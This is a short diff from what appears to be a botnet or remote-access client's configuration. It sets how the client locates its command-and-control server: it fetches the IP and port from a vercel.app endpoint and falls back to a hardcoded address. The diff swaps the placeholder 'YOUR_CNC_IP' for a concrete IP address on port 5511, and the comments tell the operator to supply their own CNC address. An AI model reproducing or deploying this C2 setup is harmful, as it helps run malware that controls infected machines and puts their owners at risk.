@@ -98,7 +98,7 @@ else:
 # Secondary: Hardcoded IP/Port (fallback)
 VERCEL_IP_FETCH_URL = "https://ipport.vercel.app/ip?key=2504"
 VERCEL_PORT_FETCH_URL = "https://ipport.vercel.app/port?key=2504"
-FALLBACK_C2_ADDRESS = "YOUR_CNC_IP" # <-- **REPLACE THIS** with a reliable static IP
+FALLBACK_C2_ADDRESS = "51.38.140.80" # <-- **REPLACE THIS** with a reliable static IP
 FALLBACK_C2_PORT = 5511            # <-- **REPLACE THIS** with your CNC port
 
 # Global variables for connection state
